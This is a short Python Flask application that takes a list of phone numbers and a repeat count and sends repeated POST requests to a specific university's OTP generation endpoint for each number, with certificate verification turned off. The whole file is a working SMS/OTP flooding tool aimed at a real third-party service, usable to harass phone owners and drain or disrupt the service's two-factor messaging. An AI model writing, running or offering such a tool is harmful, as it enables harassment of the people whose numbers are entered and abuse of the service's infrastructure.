from flask import Flask, render_template, request
import requests
import time

app = Flask(__name__)

OTP_GEN_URL = "https://twofa.srmu.ac.in/otp/generate"

# In-memory tracking (resets if server restarts)
otp_tracker = {}

@app.route("/", methods=["GET", "POST"])
def index():
    results = []
    error = None

    if request.method == "POST":
        numbers_raw = request.form.get("numbers", "").strip()
        otp_count = request.form.get("otp_count", "1").strip()

        # Validation
        if not numbers_raw:
            error = "Please enter at least one mobile number."
            return render_template("index.html", error=error)

        try:
            otp_count = int(otp_count)
            if otp_count <= 0:
                raise ValueError
        except ValueError:
            error = "OTP count must be a positive number."
            return render_template("index.html", error=error)

        # Split numbers (comma or newline)
        numbers = [
            n.strip() for n in numbers_raw.replace("\n", ",").split(",")
            if n.strip().isdigit()
        ]

        session = requests.Session()
        session.verify = False

        for phone in numbers:
            sent = 0
            otp_tracker.setdefault(phone, 0)

            for _ in range(otp_count):
                try:
                    resp = session.post(f"{OTP_GEN_URL}/{phone}/123", timeout=10)
                    sent += 1
                    otp_tracker[phone] += 1
                    time.sleep(1)  # small delay to avoid abuse
                except Exception as e:
                    results.append({
                        "phone": phone,
                        "status": f"Error: {str(e)}",
                        "sent_now": sent,
                        "total_sent": otp_tracker[phone]
                    })
                    break

            results.append({
                "phone": phone,
                "status": "OTP sent",
                "sent_now": sent,
                "total_sent": otp_tracker[phone]
            })

    return render_template("index.html", results=results, tracker=otp_tracker, error=error)


if __name__ == "__main__":
    app.run(debug=True)
